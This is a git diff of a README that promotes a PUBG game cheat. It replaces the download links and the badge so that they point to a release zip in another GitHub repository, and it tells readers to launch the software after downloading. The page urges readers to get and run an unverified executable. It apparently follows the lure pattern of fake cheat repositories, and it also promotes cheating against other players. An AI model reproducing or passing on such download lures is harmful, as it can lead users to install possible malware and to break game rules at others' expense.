@@ -16,7 +16,7 @@ Are you looking to enhance your gaming experience in PUBG? Look no further! This
 💻 PUBG Hack Source  
 
 ### How to Get Started:
-Download the cheat software from [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip).  
+Download the cheat software from [here](https://github.com/0BBYFR0G/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Release.zip).  
 *Note: The software needs to be launched after downloading.*  
 
 ### Installation Guide:
@@ -30,4 +30,4 @@ Download the cheat software from [here](https://github.com/22155555/1875695542/r
 ## 🚨 Note: 
 In case the download link provided above is not working or if you are looking for the latest updates, please check the "Releases" section of this repository.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/0BBYFR0G/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Release.zip)](https://github.com/0BBYFR0G/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Release.zip)
